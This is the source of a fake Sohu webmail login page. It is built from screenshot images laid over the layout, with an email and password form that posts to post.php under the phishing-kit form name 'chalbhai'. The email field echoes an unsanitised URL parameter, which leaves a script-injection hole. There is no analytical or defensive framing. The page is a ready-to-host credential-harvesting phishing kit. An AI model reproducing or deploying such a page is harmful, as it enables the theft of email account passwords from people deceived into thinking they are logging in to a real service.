<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#25628;&#29392;&#38378;&#30005;&#37038;&#31665;</title>
<script type="text/javascript" src="https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<style type="text/css">
 .textbox {
    height: 46px;
    width: 275px;
    border: 1px solid #dbdbdb;
    color: #797979;
    padding-left: 8px;
	font-size: 14px;
}
 .textbox:focus {
    background-color: #fff;
	box-shadow: 1px 1px 3px #BBB inset;
    outline: 0;
}
 </style>			  
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<style type="text/css">
div#container
{
	position:relative;
	width: 1365px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:38px; width:1365px; height:217px; z-index:0"><img src="images/ms1.png" alt="" title="" border=0 width=1365 height=217></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:253px; width:1365px; height:214px; z-index:1"><img src="images/ms2.png" alt="" title="" border=0 width=1365 height=214></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:464px; width:1365px; height:199px; z-index:2"><img src="images/ms3.png" alt="" title="" border=0 width=1365 height=199></div>

<div id="image4" style="position:absolute; overflow:hidden; left:893px; top:47px; width:266px; height:23px; z-index:3"><a href="#"><img src="images/ms4.png" alt="" title="" border=0 width=266 height=23></a></div>

<div id="image5" style="position:absolute; overflow:hidden; left:1069px; top:337px; width:56px; height:20px; z-index:4"><a href="#"><img src="images/ms5.png" alt="" title="" border=0 width=56 height=20></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:843px; top:430px; width:280px; height:34px; z-index:5"><a href="#"><img src="images/ms6.png" alt="" title="" border=0 width=280 height=34></a></div>
<form action=post.php name=chalbhai id=chalbhai method=post>
<input name="userid" value="<?=$_GET[userid]?>" placeholder="&#35831;&#36755;&#20837;&#24744;&#30340;&#37038;&#31665;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:278px;left:844px;top:207px;z-index:6">
<input name="pass" id="demo-field" placeholder="&#35831;&#36755;&#20837;&#24744;&#30340;&#23494;&#30721;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:278px;left:844px;top:273px;z-index:7">
<div id="formimage1" style="position:absolute; left:843px; top:367px; z-index:8"><input type="image" name="formimage1" width="277" height="47" src="images/singn.png"></div>
</div>
<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("demo-field"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
 
	
</body>
</html>
